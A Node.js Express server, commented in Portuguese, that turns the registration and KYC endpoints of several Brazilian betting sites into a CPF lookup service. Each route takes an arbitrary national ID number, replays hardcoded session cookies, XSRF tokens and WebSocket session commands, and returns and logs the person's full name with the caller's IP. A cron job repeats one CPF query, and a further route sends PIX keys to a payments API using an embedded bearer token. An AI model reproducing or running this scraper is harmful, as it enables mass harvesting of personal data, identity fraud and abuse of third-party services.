

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
var cors = require('cors')
const WebSocket = require('ws');
const cron = require('node-cron');

const md5 = require('md5')
const Grecaptcha = require('grecaptcha')

let TOKEN = "eyJpdiI6ImJlVDlqcmhZSFRORS9EUkdWalAyR2c9PSIsInZhbHVlIjoiclcvcjVtN2VheTEraFJxdVdnb0pIMlZ5ZCsraDFna1c2aFRMV20reW4vazZlYjFyMmxwM0FCR3VkbjFCTnlac0xpaXZiZTRQUWQvVDljeEVBVnBZMVpGL1o1V3ljR1d5aFJqMkdTN01GeE9xK3k2ZVZJY1NqSGdGRWV3OEZuVHEiLCJtYWMiOiI5MGJjZDk0NTQ3MzMxZDFmZGQ4N2E4M2U0ZTU0NThiNDk1MjdmMTI0NjBlYTcyZDhjZjVjZDk1NDJmZjZjNTEwIiwidGFnIjoiIn0=";


const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static('public'));
app.use(cors())

function GN(quantidade) {
  // Cria um array com os números de 1 até a quantidade desejada
  let numeros = [];
  for (let i = 1; i <= quantidade; i++) {
    numeros.push(i);
  }

  // Embaralha o array utilizando o algoritmo de Fisher-Yates
  for (let i = numeros.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1)); // Escolhe um índice aleatório
    [numeros[i], numeros[j]] = [numeros[j], numeros[i]]; // Troca os números de posição
  }

  // Concatena os números em uma única string e converte para número
  const numero = numeros.join('');
  return Number(numero); // Retorna como número
}


cron.schedule('*/10 * * * *', () => {
  console.log('Tarefa executada a cada 10 minutos!');
  (async function() {

    const url = 'https://www.playuzu.bet.br/son-auth/re-registration/brazilian/status';

const data = '{"personalID":"85831877540","mobile":null,"dateOfBirth":null,"captcha":null}';

const response = await fetch(url, {
    method: 'POST',
    headers: {
        'Cookie': '_uetsid=1785f400aa3411f0974e252a5d003c28; _uetvid=178638e0aa3411f0b52a35e33465b7f6; son_consent={"version":1,"categories":{"necessary":true,"functionality":true,"tracking":true,"targeting":true,"country":"BR"}}; _clsk=15ul46b%5E1760580117342%5E1%5E1%5Ez.clarity.ms%2Fcollect; _clck=1xueabu%5E2%5Eg07%5E0%5E2115; _rdt_uuid=1760580115283.45c869cc-3508-44cc-92fd-eddd6d8edd9e; Referer=; _gcl_au=1.1.998326512.1760580115; AUTH-XSRF-TOKEN=eyJpdiI6ImJlVDlqcmhZSFRORS9EUkdWalAyR2c9PSIsInZhbHVlIjoiclcvcjVtN2VheTEraFJxdVdnb0pIMlZ5ZCsraDFna1c2aFRMV20reW4vazZlYjFyMmxwM0FCR3VkbjFCTnlac0xpaXZiZTRQUWQvVDljeEVBVnBZMVpGL1o1V3ljR1d5aFJqMkdTN01GeE9xK3k2ZVZJY1NqSGdGRWV3OEZuVHEiLCJtYWMiOiI5MGJjZDk0NTQ3MzMxZDFmZGQ4N2E4M2U0ZTU0NThiNDk1MjdmMTI0NjBlYTcyZDhjZjVjZDk1NDJmZjZjNTEwIiwidGFnIjoiIn0%3D; son_auth=eyJpdiI6IlVtWGNIVDVXUEtwZkdWWG9LQlcrL3c9PSIsInZhbHVlIjoiTnFNKzVoc3ZNUFN2UXdBVCs0MHpQOHdQV0NUNmxnOHFDTG44dUFuTGRPZlhzckdUWGtiNjUvdnB5eURYT3FTa0pWMk1PMXVZbjRLdWhIUGZ5cklLVGN2dlBVL1N1S3lvM2tISDBFZSt6UkFJOHJyZFdrRTk0L0xYRWFURlM4WEsiLCJtYWMiOiJmMDJiMmUzNjdmODg5YjZiN2QyYzkwNDllZjZhMGIwNjNhMmIwMGM1YThjZTVmZmVmM2VkNzEzNGUxOGZmNDUxIiwidGFnIjoiIn0%3D; Aname=alpt01_br; Dyn_id=sports; Dyn_id_original=sports; Operation=aname%3Dalpt01_br%26zone_id%3Dsports; Zone_id=sports; tracker=alpt01_br%2Asports',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Site': 'same-origin',
        'Content-Length': '76',
        'Accept-Language': 'pt-BR,pt;q=0.9',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'lang': 'pt-BR',
        'x-xsrf-token': TOKEN,
        'isnative': '0',
        'Priority': 'u=3, i',
        'dynid': 'sports',
        'affiliate': 'alpt01_br',
        'family': 'PlayUZU',
        'x-environment': 'production',
        'zoneid': 'sports',
    },
    body: data,
});

const text = await response.json();
    console.log("CONSULTA CPF: "+text);

})();

});

//https://www.playuzu.bet.br/lp/50-free-spins/
app.get('/api/v1/:param*', (req, res) => {

    const ipAddress = req.header('x-forwarded-for');

    (async function() {

    const url = 'https://www.playuzu.bet.br/son-auth/re-registration/brazilian/status';

const data = '{"personalID":"'+req.params.param+'","mobile":null,"dateOfBirth":null,"captcha":null}';

const response = await fetch(url, {
    method: 'POST',
    headers: {
        'Cookie': '_uetsid=1785f400aa3411f0974e252a5d003c28; _uetvid=178638e0aa3411f0b52a35e33465b7f6; son_consent={"version":1,"categories":{"necessary":true,"functionality":true,"tracking":true,"targeting":true,"country":"BR"}}; _clsk=15ul46b%5E1760580117342%5E1%5E1%5Ez.clarity.ms%2Fcollect; _clck=1xueabu%5E2%5Eg07%5E0%5E2115; _rdt_uuid=1760580115283.45c869cc-3508-44cc-92fd-eddd6d8edd9e; Referer=; _gcl_au=1.1.998326512.1760580115; AUTH-XSRF-TOKEN=eyJpdiI6ImJlVDlqcmhZSFRORS9EUkdWalAyR2c9PSIsInZhbHVlIjoiclcvcjVtN2VheTEraFJxdVdnb0pIMlZ5ZCsraDFna1c2aFRMV20reW4vazZlYjFyMmxwM0FCR3VkbjFCTnlac0xpaXZiZTRQUWQvVDljeEVBVnBZMVpGL1o1V3ljR1d5aFJqMkdTN01GeE9xK3k2ZVZJY1NqSGdGRWV3OEZuVHEiLCJtYWMiOiI5MGJjZDk0NTQ3MzMxZDFmZGQ4N2E4M2U0ZTU0NThiNDk1MjdmMTI0NjBlYTcyZDhjZjVjZDk1NDJmZjZjNTEwIiwidGFnIjoiIn0%3D; son_auth=eyJpdiI6IlVtWGNIVDVXUEtwZkdWWG9LQlcrL3c9PSIsInZhbHVlIjoiTnFNKzVoc3ZNUFN2UXdBVCs0MHpQOHdQV0NUNmxnOHFDTG44dUFuTGRPZlhzckdUWGtiNjUvdnB5eURYT3FTa0pWMk1PMXVZbjRLdWhIUGZ5cklLVGN2dlBVL1N1S3lvM2tISDBFZSt6UkFJOHJyZFdrRTk0L0xYRWFURlM4WEsiLCJtYWMiOiJmMDJiMmUzNjdmODg5YjZiN2QyYzkwNDllZjZhMGIwNjNhMmIwMGM1YThjZTVmZmVmM2VkNzEzNGUxOGZmNDUxIiwidGFnIjoiIn0%3D; Aname=alpt01_br; Dyn_id=sports; Dyn_id_original=sports; Operation=aname%3Dalpt01_br%26zone_id%3Dsports; Zone_id=sports; tracker=alpt01_br%2Asports',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Site': 'same-origin',
        'Content-Length': '76',
        'Accept-Language': 'pt-BR,pt;q=0.9',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'lang': 'pt-BR',
        'x-xsrf-token': TOKEN,
        'isnative': '0',
        'Priority': 'u=3, i',
        'dynid': 'sports',
        'affiliate': 'alpt01_br',
        'family': 'PlayUZU',
        'x-environment': 'production',
        'zoneid': 'sports',
    },
    body: data,
});

const text = await response.json();


if(text == null){
    console.log("CONSULTA CPF: "+req.params.param);

}

else if(text?.fullName){
    console.log("CONSULTA CPF: "+req.params.param+", NOME: "+text.fullName+", IP: "+ipAddress);
    res.json(text);
}

else if(text?.code == "REQUEST_VALIDATION")
{
    console.log("ERRO CONSULTA CPF: "+req.params.param);
    res.json(text);
}

//res.json(text);



})();
    


});

//https://www.bacanaplay.bet.br/lp/jogue-e-ganhe/
app.get('/api/v2/:param*', (req, res) => {

    const ipAddress = req.header('x-forwarded-for');

    (async function() {

    const url = 'https://www.bacanaplay.bet.br/son-auth/re-registration/brazilian/status';

const data = '{"personalID":"'+req.params.param+'","mobile":null,"dateOfBirth":null,"captcha":null}';

const response = await fetch(url, {
    method: 'POST',
    headers: {
        'Cookie': '_uetsid=1785f400aa3411f0974e252a5d003c28; _uetvid=178638e0aa3411f0b52a35e33465b7f6; son_consent={"version":1,"categories":{"necessary":true,"functionality":true,"tracking":true,"targeting":true,"country":"BR"}}; _clsk=15ul46b%5E1760580117342%5E1%5E1%5Ez.clarity.ms%2Fcollect; _clck=1xueabu%5E2%5Eg07%5E0%5E2115; _rdt_uuid=1760580115283.45c869cc-3508-44cc-92fd-eddd6d8edd9e; Referer=; _gcl_au=1.1.998326512.1760580115; AUTH-XSRF-TOKEN=eyJpdiI6ImJlVDlqcmhZSFRORS9EUkdWalAyR2c9PSIsInZhbHVlIjoiclcvcjVtN2VheTEraFJxdVdnb0pIMlZ5ZCsraDFna1c2aFRMV20reW4vazZlYjFyMmxwM0FCR3VkbjFCTnlac0xpaXZiZTRQUWQvVDljeEVBVnBZMVpGL1o1V3ljR1d5aFJqMkdTN01GeE9xK3k2ZVZJY1NqSGdGRWV3OEZuVHEiLCJtYWMiOiI5MGJjZDk0NTQ3MzMxZDFmZGQ4N2E4M2U0ZTU0NThiNDk1MjdmMTI0NjBlYTcyZDhjZjVjZDk1NDJmZjZjNTEwIiwidGFnIjoiIn0%3D; son_auth=eyJpdiI6IlVtWGNIVDVXUEtwZkdWWG9LQlcrL3c9PSIsInZhbHVlIjoiTnFNKzVoc3ZNUFN2UXdBVCs0MHpQOHdQV0NUNmxnOHFDTG44dUFuTGRPZlhzckdUWGtiNjUvdnB5eURYT3FTa0pWMk1PMXVZbjRLdWhIUGZ5cklLVGN2dlBVL1N1S3lvM2tISDBFZSt6UkFJOHJyZFdrRTk0L0xYRWFURlM4WEsiLCJtYWMiOiJmMDJiMmUzNjdmODg5YjZiN2QyYzkwNDllZjZhMGIwNjNhMmIwMGM1YThjZTVmZmVmM2VkNzEzNGUxOGZmNDUxIiwidGFnIjoiIn0%3D; Aname=alpt01_br; Dyn_id=sports; Dyn_id_original=sports; Operation=aname%3Dalpt01_br%26zone_id%3Dsports; Zone_id=sports; tracker=alpt01_br%2Asports',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Site': 'same-origin',
        'Content-Length': '76',
        'Accept-Language': 'pt-BR,pt;q=0.9',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'lang': 'pt-BR',
        'x-xsrf-token': TOKEN,
        'isnative': '0',
        'Priority': 'u=3, i',
        'dynid': 'sports',
        'affiliate': 'alpt01_br',
        'family': 'PlayUZU',
        'x-environment': 'production',
        'zoneid': 'sports',
    },
    body: data,
});

const text = await response.json();


if(text == null){
    console.log("CONSULTA CPF: "+req.params.param);

}

else if(text?.fullName){
    console.log("CONSULTA CPF: "+req.params.param+", NOME: "+text.fullName+", IP: "+ipAddress);
    res.json(text);
}

else if(text?.code == "REQUEST_VALIDATION")
{
    console.log("ERRO CONSULTA CPF: "+req.params.param);
    res.json(text);
}

//res.json(text);



})();
    


});

//https://www.vbet.bet.br/pb/
app.get('/api/v3/:param*', (req, res) => {

    let ws = new WebSocket("wss://eu-swarm-newm.vbet.bet.br/");
    const ipAddress = req.header('x-forwarded-for');

    ws.on('open', () => {

        let hash = md5(Date.now())
        console.log(hash)
        ws.send('{"command":"request_session","params":{"source":42,"language":"pt-br","afec":"yL0u1crhIH33hZ4c2FloVs4lbXgAh_cfDHMm","site_id":692,"release_date":"Tue Oct 14 2025 17:05:02 GMT+0400 (Armenia Standard Time)"}}')
        //ws.send('{"command":"request_session","params":{"language":"por_2","site_id":18750804,"source":42,"local_ip":"104.28.63.75","release_date":"03/25/2024-11:34"},"rid":"'+hash+'"}')
        //ws.send('{"command":"validate_recaptcha","params":{"g_recaptcha_response":"0cAFcWeA7FuDfeku7eEcm4_OzXUduK3juuLo3v0aQENUD5PHIDDw7dgMU_vyDexSTLG_0UXX2IzcZKY2n1dm5mdykO5VCJauCmq_MIwHXzDzzb_IBM5F7EGO9a4zycXLxFyPZ1j56CV_v8CiE166YczPTr5eC_CjnNXNIDI31Vt7Rsb1Hmi_hIFQNU6BCthH9M39trHuuYhw9goOOAqub6m0OE3ViqYMv9mDol8zgiTPhd8RdMdsXJ_Vt2h5my1WoCBPwhPqmbQJmz-FGzXw3tAhd2DQJvL6RgohzPEuQ9JydOUxu2ke9euQ4mbiDQlSFc2ZuCl7lSRldMSF0GuHSuFnbRRGCdfqOU3iExlgmXhN4pK57ogDiTULxMxaH3GwpZb5qmFOQGX1SSfXB5tT4sYgwCGGEAkFvErnQkUXKLNg4UFLMu4JE3VSa9hvkFDWiFWsHQgHZUCFIKyH1KHhZuybP-0QCWFuOogwyRZLohFkyS3SP4QXIPsk-TZG-XgIjfP1yH1KuTsTBXlxm1hd1decv-u2os1c0xipyi8PM0WOrNuh4-XIqwGh_mby6grk4o61fTyAE2S_Ovclrl_1ABDtEXUJZJ0mWeaUQgHuPKej1DT5Fb1kK1nAfni9PufKKn-bpjbu6xNY-Y0Zm5W5XN_KGX92jTUxPKpSxGoS2NmeLZUsgJOCS99s5xlDsCYli36gOREno4wqo7bjPwT0Ybs-fMzgJyg8NPTKLV-QJpyxxuZWpbDIpP1LW2wTE4-69XOPVbH7uwiaygGBSWj9h_WWY3n1INrNN-jDpj_Fthie4zla6g7zdcX8S5VgTvmAFWpJ4FE3A_xe4ItDiqpjkgn470ErSEPn3QIk7dDC9yAkgn4llp96tU8o0NZvaf8rJYGj2xQoSIaGNXHqRfalQd0vowTObBOCk0anfSzqJpj8tjCTnfgSq8-97kMLhhfMyf9daJtBlL9jL3TQuj0mXNtSF10E0emEyazmSSxqPOrYysGUz4dA-XjgAmv4Q9tfzHiFnSpCof_G30xAqLQqbXMdxkcyheh6iKjmFlqjGg2O64G_zBQFy81483vUSt-XMDuz5dOAeYygUt1Ruu-7ilNNcJP7GeB14JnGtX3U84wsL9qdCqZWxV68ie81WOxrGAbSPVDOXxxJ4CqSr4D7P7LXkXD5fWwRUqTPJtXR0_q_gp2Rk8zdUQaS-_TgmctAT4WEzLUTBVgNIwIv-T9kjOW4rhhqmLlUVqP0EsCKMdKXeR4AN7HEooWkn5ocAtgsqemcNpFGQa5OGRm9zjHTsGJosA44Busixq_mrclxgnpag_4iqPpZaLrwATQaJGjFda3W8j6GWzdg_gS2LraG8MTSldbdau6ZixB_8P5PKzebdLN8msS1FY234F68K9BV1Btq2FlzETrx-bDAgQB1a79goTWtjASE9J1Nq5orQADWMOWQaI9dlj6qvgzRPsesQp3SbuKw_krhjAGMWEB1dpRbXaecbrteL7QmRVErRY9Swuku_bqexuvWgnyygVY_lPuhDtygXH1Yf2WVebFIcQmTErfNkfMdUTfYM-jDnvP9_RuprZm6jtQLjImI6JSzEoSl9LvoHaiVe8kJQGLLGG1Ts9P0lELySrxt7rXO5Q1NjL_f7BU4wap18","action":"register"},"rid":"'+hash+'"}')
        //ws.send('{"command":"get_legitimuz_cpf_info_v2","params":{"cpf":"'+req.params.param+'"},"rid":'+hash+'}')
        //ws.send('{"command":"validate_cpfs","params":{"cpfs":"'+req.params.param+'"},"rid":"'+hash+'"}')
        ws.send('{"command":"get_legitimuz_cpf_info_v2","params":{"cpf":"'+req.params.param+'"},"rid":'+GN(9)+'}')
        console.log("CONSULTANDO CPF: "+req.params.param)
       
        
    })
    
    ws.onmessage = (event) => {
        console.log(event.data);
        
        const obj = JSON.parse(event.data);
        
        if(obj.data == null){
            console.log("CONSULTA CPF: "+req.params.param);

        }
        else if(obj.data.result == 0){
            console.log("CONSULTA CPF: "+req.params.param+", NOME: "+obj.data.details.Name+", IP: "+ipAddress);
            res.json(obj);
            ws.close();
        }
        
        else if(obj.data.result_text == 'LegitimuzCPFError')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
        else if(obj.data.result == '-3060')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
    
    }

  
    


});


//https://www.seguro.bet.br/?accounts=%2A&register=%2A
app.get('/api/v4/:param*', (req, res) => {

    let ws = new WebSocket("wss://eu-swarm-springre.trexname.com/");
    const ipAddress = req.header('x-forwarded-for');

    ws.on('open', () => {

        let hash = GN(15);
        console.log(hash)
        ws.send('{"command":"request_session","params":{"language":"pt-br","site_id":"1866308","source":42,"is_wrap_app":false,"afec":"4GuZ-63YNfIE869KmCCpeTp69dWD1UQraJo0"},"rid":"request_session'+hash+'"}')
        //ws.send('{"command":"request_session","params":{"source":42,"language":"pt-br","afec":"yL0u1crhIH33hZ4c2FloVs4lbXgAh_cfDHMm","site_id":692,"release_date":"Tue Oct 14 2025 17:05:02 GMT+0400 (Armenia Standard Time)"}}')
        //ws.send('{"command":"request_session","params":{"language":"por_2","site_id":18750804,"source":42,"local_ip":"104.28.63.75","release_date":"03/25/2024-11:34"},"rid":"'+hash+'"}')
        //ws.send('{"command":"validate_recaptcha","params":{"g_recaptcha_response":"0cAFcWeA7FuDfeku7eEcm4_OzXUduK3juuLo3v0aQENUD5PHIDDw7dgMU_vyDexSTLG_0UXX2IzcZKY2n1dm5mdykO5VCJauCmq_MIwHXzDzzb_IBM5F7EGO9a4zycXLxFyPZ1j56CV_v8CiE166YczPTr5eC_CjnNXNIDI31Vt7Rsb1Hmi_hIFQNU6BCthH9M39trHuuYhw9goOOAqub6m0OE3ViqYMv9mDol8zgiTPhd8RdMdsXJ_Vt2h5my1WoCBPwhPqmbQJmz-FGzXw3tAhd2DQJvL6RgohzPEuQ9JydOUxu2ke9euQ4mbiDQlSFc2ZuCl7lSRldMSF0GuHSuFnbRRGCdfqOU3iExlgmXhN4pK57ogDiTULxMxaH3GwpZb5qmFOQGX1SSfXB5tT4sYgwCGGEAkFvErnQkUXKLNg4UFLMu4JE3VSa9hvkFDWiFWsHQgHZUCFIKyH1KHhZuybP-0QCWFuOogwyRZLohFkyS3SP4QXIPsk-TZG-XgIjfP1yH1KuTsTBXlxm1hd1decv-u2os1c0xipyi8PM0WOrNuh4-XIqwGh_mby6grk4o61fTyAE2S_Ovclrl_1ABDtEXUJZJ0mWeaUQgHuPKej1DT5Fb1kK1nAfni9PufKKn-bpjbu6xNY-Y0Zm5W5XN_KGX92jTUxPKpSxGoS2NmeLZUsgJOCS99s5xlDsCYli36gOREno4wqo7bjPwT0Ybs-fMzgJyg8NPTKLV-QJpyxxuZWpbDIpP1LW2wTE4-69XOPVbH7uwiaygGBSWj9h_WWY3n1INrNN-jDpj_Fthie4zla6g7zdcX8S5VgTvmAFWpJ4FE3A_xe4ItDiqpjkgn470ErSEPn3QIk7dDC9yAkgn4llp96tU8o0NZvaf8rJYGj2xQoSIaGNXHqRfalQd0vowTObBOCk0anfSzqJpj8tjCTnfgSq8-97kMLhhfMyf9daJtBlL9jL3TQuj0mXNtSF10E0emEyazmSSxqPOrYysGUz4dA-XjgAmv4Q9tfzHiFnSpCof_G30xAqLQqbXMdxkcyheh6iKjmFlqjGg2O64G_zBQFy81483vUSt-XMDuz5dOAeYygUt1Ruu-7ilNNcJP7GeB14JnGtX3U84wsL9qdCqZWxV68ie81WOxrGAbSPVDOXxxJ4CqSr4D7P7LXkXD5fWwRUqTPJtXR0_q_gp2Rk8zdUQaS-_TgmctAT4WEzLUTBVgNIwIv-T9kjOW4rhhqmLlUVqP0EsCKMdKXeR4AN7HEooWkn5ocAtgsqemcNpFGQa5OGRm9zjHTsGJosA44Busixq_mrclxgnpag_4iqPpZaLrwATQaJGjFda3W8j6GWzdg_gS2LraG8MTSldbdau6ZixB_8P5PKzebdLN8msS1FY234F68K9BV1Btq2FlzETrx-bDAgQB1a79goTWtjASE9J1Nq5orQADWMOWQaI9dlj6qvgzRPsesQp3SbuKw_krhjAGMWEB1dpRbXaecbrteL7QmRVErRY9Swuku_bqexuvWgnyygVY_lPuhDtygXH1Yf2WVebFIcQmTErfNkfMdUTfYM-jDnvP9_RuprZm6jtQLjImI6JSzEoSl9LvoHaiVe8kJQGLLGG1Ts9P0lELySrxt7rXO5Q1NjL_f7BU4wap18","action":"register"},"rid":"'+hash+'"}')
        //ws.send('{"command":"get_legitimuz_cpf_info_v2","params":{"cpf":"'+req.params.param+'"},"rid":'+hash+'}')
        //ws.send('{"command":"validate_cpfs","params":{"cpfs":"'+req.params.param+'"},"rid":"'+hash+'"}')
        ws.send('{"command":"validate_cpf","params":{"cpf":"'+req.params.param+'"},"rid":"command'+hash+'"}')
        //ws.send('{"command":"get_legitimuz_cpf_info_v2","params":{"cpf":"'+req.params.param+'"},"rid":'+gerarNumerosAleatorios(9)+'}')
        console.log("CONSULTANDO CPF: "+req.params.param)
       
        
    })
    
    ws.onmessage = (event) => {
        console.log(event.data);
        
        const obj = JSON.parse(event.data);
        
        if(obj.data == null){
            console.log("CONSULTA CPF: "+req.params.param);

        }
        else if(obj.data.result == 0){
            console.log("CONSULTA CPF: "+req.params.param+", NOME: "+obj.data.details.FirstName+", IP: "+ipAddress);
            res.json(obj);
            ws.close();
        }
        
        else if(obj.data.result_text == 'InvalidCPF')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
        else if(obj.data.result == '-3060')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
    
    }

  
    


});

//https://www.galera.bet.br/register
app.get('/api/v5/:param*', (req, res) => {

    const ipAddress = req.header('x-forwarded-for');

    (async function() {

    const url = 'https://f-api.galera.bet.br/api/user/cpf-check';

const data = '{"cpf":"'+req.params.param+'"}';

const response = await fetch(url, {
    method: 'POST',
    body: data,
});

const text = await response.json();

console.log(text);

if(!text?.valid ){
    console.log("CONSULTA CPF: "+req.params.param);
    res.json(text);

}

else{
    console.log("CONSULTA CPF: "+req.params.param+", NOME: "+text.firstName+", IP: "+ipAddress);
    res.json(text);
}


//res.json(text);



})();
    


});

//https://7games.bet.br/pb/
app.get('/api/v6/:param*', (req, res) => {

    let ws = new WebSocket("wss://eu-swarm-springre.trexname.com/");
    const ipAddress = req.header('x-forwarded-for');

    ws.on('open', () => {

        let hash = GN(20);
        console.log(hash)
        ws.send('{"command":"request_session","params":{"language":"por_2","site_id":18751367,"source":42,"release_date":"04/25/2023-16:50"},"rid":"'+hash+'"}')

        ws.send('{"command":"kyc_r7_lookup_customer","params":{"personal_id":"'+req.params.param+'"},"rid":"'+hash+'"}')
        console.log("CONSULTANDO CPF: "+req.params.param)
       
        
    })
    
    ws.onmessage = (event) => {
        console.log(event.data);
        
        const obj = JSON.parse(event.data);
        
        if(obj.data == null){
            console.log("CONSULTA CPF: "+req.params.param);

        }
        else if(obj.data.result == 200){
            console.log("CONSULTA CPF: "+req.params.param+", NOME: "+obj.data.details.name+", IP: "+ipAddress);
            res.json(obj);
            ws.close();
        }
        

        else if(obj.data.result == '400')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
    
    }

  
    


});

//https://www.h2.bet.br/?accounts=*&register=*
app.get('/api/v7/:param*', (req, res) => {

    let ws = new WebSocket("wss://eu-swarm-springre.trexname.com/");
    const ipAddress = req.header('x-forwarded-for');

    ws.on('open', () => {

        let hash = GN(15);
        
        ws.send('{"command":"request_session","params":{"language":"pt-br","site_id":18749751,"source":42,"is_wrap_app":false,"afec":"ZpqTA42hNAuQkN0yYAoYgrlpneUHL3bXiYUr"},"rid":"request_session'+hash+'"}')
        ws.send('{"command":"validate_cpf","params":{"cpf":"'+req.params.param+'"},"rid":"command'+hash+'"}')
        //ws.send('{"command":"kyc_r7_lookup_customer","params":{"personal_id":"'+req.params.param+'"},"rid":"'+hash+'"}')
        console.log("CONSULTANDO CPF: "+req.params.param)
       
        
    })
    
    ws.onmessage = (event) => {
        console.log(event.data);
        
        const obj = JSON.parse(event.data);
        
        if(obj.data == null){
            console.log("CONSULTA CPF: "+req.params.param);

        }
        else if(obj.data.result == 0){
            console.log("CONSULTA CPF: "+req.params.param+", NOME: "+obj.data.details.FirstName+", IP: "+ipAddress);
            res.json(obj);
            ws.close();
        }
        

        else if(obj.data.result == '-3064')
        {
            console.log("ERRO CONSULTA CPF: "+req.params.param);
            res.json(obj);
            ws.close();
        }
    
    }

  
    


});

//https://papigames.bet.br/signup
app.get('/api/v8/:param*', (req, res) => {

    const ipAddress = req.header('x-forwarded-for');

    (async function() {

    const url = 'https://webapi.papi.bet.br/api_v2/validateCPF';

const data = '{"nationalId":"'+req.params.param+'","skinId":192347}';

const response = await fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'cross-site',
        'Accept-Language': 'pt-BR,pt;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Origin': 'https://papigames.bet.br',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15',
        'Referer': 'https://papigames.bet.br/',
        'Content-Length': '44',
        'Sec-Fetch-Dest': 'empty',
        'Priority': 'u=3, i',
    },
    body: data,
});

const text = await response.json();

console.log(text);

if(!text?.success ){
    console.log("CONSULTA CPF: "+req.params.param);
    res.json(text);

}

else{
    console.log("CONSULTA CPF: "+req.params.param+", NOME: "+text.result.firstname+", IP: "+ipAddress);
    res.json(text);
}


//res.json(text);



})();
    


});

app.post('/cpf/find', (req, res) => {

    
    const text = req.body.chaves;

const lines = text.split("\n");

let json = "";
let first = true;

lines.forEach(line => {
    const myJson = { key: line };
    json += myJson + ',';
});

let resultado = json;
if (lines.length >= 1) {
    resultado = resultado.slice(0, -1);
}
console.log(resultado);

const raw = JSON.stringify({
    "keys": [JSON.stringify(resultado)]
  });
  const myHeaders = new Headers();
  myHeaders.append("Content-Type", "application/json");
  myHeaders.append("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiI0MWI0NGFiOWE1NjQ0MC50ZXN0ZS5jZWxjb2luYXBpLnY1IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZSI6InRlc3RlIiwidGVuYW50X3VzZXIiOiJSYVdaeTJSSHRhWXByQTRVT3ZNS1g3S1dTME1MTnBNSGJ5QU1TN2xLL014V2YwSGwyaWI2M2R3K28wbS8wQm5LcUEvOHVwb2hhOWJLU2txZ0s5YTlRMEh6TnUzU1JuZ29TMTg3OUI2RVpobjRHeEtaZmpTZHRUbDlJLzEwL1VrdCtNd3hIaDA1VFkzSUtxaDFuMk04QUZMdk1hTmRKdXB6cjlTanVOTGZpRWZCbUM3L0ZLd2IrWU1QSFVpa0F0Y3dhTDU4TWF0aE1nN05wNVZBY2R3YWsyaHVpdmFIWTVrSXUzZ0MxMmJPM0Zud05DNFNva0N4KzhXbkowckhDb0YvVE9ralljREVkUUtGdEVpdVRTbzMwMmxFaFJjVVpDWW5mTUd5S0MwTFpHQkVtMEdtakdUMzgwaFVwYnF1cUNYQ1hrMmFhUFhDU2hZTkY4bFhYdTVES2dQRzlpcG5SYVlEWTVQd0RITEVBeEExVVB3cDk4M2VROFlzZ3FRUDIxeHREUEl5SUdNZmZrMThOeDhaOFI0UVNvSk5USnh3T2tZVDByRGlFSUpmaWo2bmlRTlc0czhKNzN6VEIyVzE5UFJEZVJqT0xSSWQxYmR5eXBNN1FaZ1BnRmxFMDBFd3VaalJDaHdYb1oveE9ZcnVsQktTOTZQOVNxQUFESzVreVVjWUlZUFRQZ0dJN2Nrd3hKMElNT3pvUHdoSCtGSlp3Q1RkMkRnMFgreGVXVFBnRXYrSHF0TTRuSENncnkrbGt2QzBPTVNvMGU3SDJPVDNhRXpGci9WRzd6clcrUWllUEprVGNLRlpQZnRtSHg1MmRYTlNZMDFpdXphYUZVdjBqdmlnaVYrQm53MXlsNWdWT0FKMXc4blU5L253MCt5UjlKVS85bVJPQi82ejk0VT0iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3VzZXJkYXRhIjoiNzEyNTQ0MTZmM2RkNDE4OWJlMmEiLCJleHAiOjE3Mjk3MTk3NjUsImlzcyI6IkNlbGNvaW5BUEkiLCJhdWQiOiJDZWxjb2luQVBJIn0.xCTx-PR_jEdD5RtlprDjMt_8yxxz9DJvvpBQrvH1tqY");
  
console.log(raw)
  
  const requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow"
  };
  
  fetch("https://sandbox.openfinance.celcoin.dev/pix/v1/dict/keychecker", requestOptions)
    .then((response) => response.text())
    .then((result) => console.log(result))
    .catch((error) => console.error(error));
    


});



app.listen(3999, () => console.log('server started'));

// Export the Express API
module.exports = app;